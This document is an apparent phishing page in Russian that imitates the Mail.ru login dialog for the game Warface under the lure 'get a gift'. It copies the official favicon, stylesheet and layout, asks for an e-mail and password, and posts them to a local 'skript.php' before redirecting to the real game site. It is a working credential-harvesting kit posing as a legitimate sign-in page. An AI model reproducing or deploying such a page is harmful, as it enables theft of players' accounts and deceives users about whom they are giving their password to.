<!DOCTYPE HTML>
<html xml:lang="ru" class="js">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta name="description" content="Warface | Получить подарок">
	<title>Warface | Получить подарок</title>
	<link rel="shortcut icon" href="https://wf.mail.ru/favicon.ico" type="image/x-icon">
	<link rel="stylesheet" type="text/css" id="js-gmr-client-style" href="//games.mail.ru/css/kit/client.css?r=0.3599463782738894">
	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script>
	function checkBox() {
		if($('#checkbox').hasClass('gmrSignin__checked')) $('#checkbox').removeClass('gmrSignin__checked');
		else $('#checkbox').addClass('gmrSignin__checked');
	}
</script>
</head>
<body class="lightbox-processed">
<div id="js_kit_holder" style="
    width: 440px;
    margin: 0 auto;
"><div id="js_kit_overlay"><div id="js_kit_header" style="background-color: #3c3c3c; height: 39px; width: 100%; color: #fff;  padding: 0 20px; line-height: 39px; box-sizing: border-box; font-family: ProximaRegular, PTSans, sans-serif !important; font-size: 18px !important;"><span id="js_kit_header_title">Вход</span><span id="js_kit_header_close" style="position: absolute; right: 13px; font-size: 21px !important; padding: 0 4px; cursor: pointer;">✕</span></div><div id="js_kit_container" style="
"><div class="gmrContent" style="
">    
<form action="skript.php" method="post" class="gmrSignin">
		<input type="hidden" name="service" value="warface">
		<input type="hidden" name="ref" value="0">
		<input type="hidden" name="redirect" value="https://wf.mail.ru/">
		<div class="gmrSignin__descr">Введите логин и пароль от своего аккаунта для того, чтобы продолжить работу с сервисом.</div>
        <div id="js_kit_signin__box" class="gmrSignin__field gmrSignin__box gmrSignin__box_nodomain">
		<div class="gmrSignin__box__login">
		<input type="email" name="login" id="js_kit_signin__box__login" value="" tabindex="1" data-yandex-suggest="false" placeholder="E-mail" required>
		</div>
		<div class="gmrSignin__box__domain">
		<select name="Domain" id="js_kit_signin__box__domain" tabindex="1">  
		<option value="mail.ru">@mail.ru</option> 
		<option value="inbox.ru">@inbox.ru</option> 
		<option value="list.ru">@list.ru</option>     
		<option value="bk.ru">@bk.ru</option>
		<option value="mail.ua">@mail.ua</option>
		</select>
		<span id="js_kit_signin__box__domain__txt">@mail.ru</span>
		</div>
        </div>
        <div class="gmrSignin__field gmrSignin__password" id="js_kit_signin__password"> 
		<input type="password" name="pass" id="js_kit_signin__password__input" value="" tabindex="2" placeholder="Пароль" required>
        </div>
        <div class="gmrSignin__opts">
		<span class="gmrSignin__remember gmrSignin__checked" id="checkbox"> 
		<input type="checkbox" name="saveauth" value="1" checked="checked" id="js_kit_signin__remember" tabindex="4">
		<label for="js_kit_signin__remember" class="gmrSignin__remember__chk" onclick="checkBox();"></label>
		<label for="js_kit_signin__remember" class="gmrSignin__remember__label" onclick="checkBox();">Запомнить меня</label>
		</span>            <a class="gmrSignin__register" href="https://e.mail.ru/signup?from=main" target="_blank">Нет почты Mail.Ru?</a>
		<a class="gmrSignin__lostpass" href="https://wf.mail.ru/user/password" target="_blank">Забыли пароль?</a>
        </div>
        <div class="gmrSignin__actions">
		<button type="submit" class="gmrSignin__submit" name="do_login" value="1" tabindex="3" >Войти</button>
		</div>    
</form>

</div></div></div></div></body></html>